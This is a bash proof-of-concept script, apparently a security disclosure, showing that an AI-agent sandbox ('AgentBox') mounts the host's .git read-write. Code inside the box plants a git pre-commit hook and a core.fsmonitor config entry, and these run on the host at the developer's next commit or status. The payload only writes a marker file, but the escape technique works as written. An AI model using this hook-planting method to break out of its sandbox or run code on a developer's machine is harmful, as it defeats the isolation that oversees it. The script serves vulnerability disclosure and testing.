#!/usr/bin/env bash
#
# PoC: Box -> Host RCE via the read-write `.git/` bind mount (docker backend)
# ---------------------------------------------------------------------------
# AgentBox's docker backend bind-mounts the host repo's `.git/` directory into
# the box, READ-WRITE, at its identical host path:
#
#     packages/sandbox-docker/src/create.ts:724
#         extraVolumes.push(`${w.hostMainRepo}/.git:${w.hostMainRepo}/.git`);
#
# There is no `:ro`, no `core.hooksPath` redirect, and no filtering of the
# hooks/ or config that the box can write. The untrusted agent inside the box
# therefore controls the host repo's `.git/hooks/*` and `.git/config`. Git
# executes those on the HOST the next time the developer (or AgentBox itself)
# runs any git command in that repo -- which is the entire designed workflow
# (review commits, checkout between boxes, pull, push; the tray app has buttons
# for all of them).
#
# This models the exact mount with a plain unprivileged container (uid 1000 =
# the box's `vscode` user). It uses NO extra capabilities -- the escape is the
# mount alone, independent of the SYS_ADMIN/unconfined profile the box also has.
#
# Threat-model item: #1 -- a box escaping isolation and reaching the host.
#
# Requirements: docker, git, setpriv (all present on a normal host).
# Safe: everything happens under a throwaway temp dir + a marker in the host
# user's home; the script cleans up after itself.

set -euo pipefail

IMAGE="${POC_IMAGE:-agentbox-poc-mini:latest}"   # stand-in for agentbox/box:dev
HOST_UID=1000                                    # the host developer (here: ubuntu)
HOST_HOME="$(getent passwd "$HOST_UID" | cut -d: -f6)"
MARKER="${HOST_HOME}/.agentbox_poc_pwned"

say()  { printf '\n\033[1m== %s ==\033[0m\n' "$*"; }
info() { printf '   %s\n' "$*"; }

# ---------------------------------------------------------------------------
say "0. Preconditions"
command -v docker >/dev/null || { echo "docker required"; exit 1; }
docker image inspect "$IMAGE" >/dev/null 2>&1 || {
  echo "Image $IMAGE not found. Build it first (see README.md 'Building the stand-in box image')."
  exit 1
}
rm -f "$MARKER"
info "box image:        $IMAGE (runs as uid ${HOST_UID}, no caps, no --privileged)"
info "host developer:   uid ${HOST_UID} ($(getent passwd $HOST_UID | cut -d: -f1)), home ${HOST_HOME}"
info "proof marker:     ${MARKER} (must NOT exist yet)"

# ---------------------------------------------------------------------------
say "1. Set up a host project git repo (owned by the host developer)"
WORK="$(mktemp -d /tmp/agentbox-poc.XXXXXX)"
chown "${HOST_UID}:${HOST_UID}" "$WORK"
REPO="${WORK}/myproject"
run_as_host() { setpriv --reuid "$HOST_UID" --regid "$HOST_UID" --clear-groups \
    env HOME="$HOST_HOME" GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null "$@"; }
run_as_host mkdir -p "$REPO"
run_as_host git -C "$REPO" init -q
run_as_host git -C "$REPO" config user.email dev@example.com
run_as_host git -C "$REPO" config user.name  dev
run_as_host bash -c "echo hello > '$REPO/README.md'"
run_as_host git -C "$REPO" add README.md
run_as_host git -C "$REPO" -c core.hooksPath=/dev/null commit -qm init
info "created host repo at $REPO ($(run_as_host git -C "$REPO" rev-parse --short HEAD))"
info "hooks dir before box: $(run_as_host ls "$REPO/.git/hooks" | grep -c . ) sample files, no active pre-commit"

# ---------------------------------------------------------------------------
say "2. Start a box with AgentBox's exact mount and plant the payload from inside"
info "mount reproduced verbatim:  -v ${REPO}/.git:${REPO}/.git   (RW, same path as create.ts:724)"

# The container is the untrusted agent. It writes the host repo's .git/hooks
# and .git/config -- nothing else. Note: it has no view of the host's home;
# it only mounted .git. Any host-home file that appears later proves HOST exec.
# The container is the untrusted agent. GITDIR is the mounted host .git at its
# identical host path -- passed in explicitly so the box script needs nothing
# beyond a shell (matching how the real box already knows its own path).
docker run --rm -i \
  --user "${HOST_UID}:${HOST_UID}" \
  --hostname the-box \
  -v "${REPO}/.git:${REPO}/.git" \
  -e MARKER="$MARKER" \
  -e GITDIR="${REPO}/.git" \
  "$IMAGE" /bin/bash -s <<'BOX_SCRIPT'
set -e
echo "   [box] I am $(id) on host '$(hostname)'; the mounted host .git is at: $GITDIR"

# (a) classic hook: fires on the developer's next `git commit`
cat > "$GITDIR/hooks/pre-commit" <<HOOK
#!/bin/sh
{ echo "PWNED via .git/hooks/pre-commit"
  echo "when:     \$(date)"
  echo "ran as:   \$(id)"
  echo "on host:  \$(hostname)"
  echo "uname:    \$(uname -a)"
} > "$MARKER"
HOOK
chmod +x "$GITDIR/hooks/pre-commit"
echo "   [box] planted $GITDIR/hooks/pre-commit"

# (b) config-only variant: fires on the developer's next `git status`, no hook
#     file in hooks/ required. git runs core.fsmonitor as a program.
cat > "$GITDIR/fsm" <<FSM
#!/bin/sh
{ echo "PWNED via .git/config core.fsmonitor"
  echo "when:    \$(date)"
  echo "ran as:  \$(id)"
  echo "on host: \$(hostname)"
} >> "$MARKER"
exit 0
FSM
chmod +x "$GITDIR/fsm"
printf '\n[core]\n\tfsmonitor = %s/fsm\n' "$GITDIR" >> "$GITDIR/config"
echo "   [box] set core.fsmonitor = $GITDIR/fsm in $GITDIR/config"
BOX_SCRIPT

info "box has exited. The host repo's .git now carries the box-planted payload."

# ---------------------------------------------------------------------------
say "3. The host developer runs a routine git command in their own repo"
info "This is the intended AgentBox workflow: the human reviews/commits on the host."
[ -f "$MARKER" ] && { echo "unexpected: marker exists before host git ran"; exit 1; }

run_as_host bash -c "echo 'more work' >> '$REPO/README.md'"
run_as_host git -C "$REPO" add README.md
info "developer runs: git commit -m 'progress'"
run_as_host git -C "$REPO" commit -qm 'progress' || true
info "developer runs: git status"
run_as_host git -C "$REPO" status >/dev/null 2>&1 || true

# ---------------------------------------------------------------------------
say "4. Result"
if [ -f "$MARKER" ]; then
  printf '\033[1;31mVULNERABLE\033[0m -- the box executed code on the HOST. Marker %s:\n\n' "$MARKER"
  sed 's/^/     /' "$MARKER"
  echo
  info "The box (uid ${HOST_UID}, unprivileged container, hostname 'the-box') planted the"
  info "payload; it ran on the HOST (hostname '$(hostname)') as the host developer."
  RC=0
else
  printf '\033[1;32mNOT reproduced\033[0m -- no marker written.\n'
  RC=1
fi

say "5. Cleanup"
rm -f "$MARKER"
rm -rf "$WORK"
info "removed $WORK and $MARKER"
exit $RC
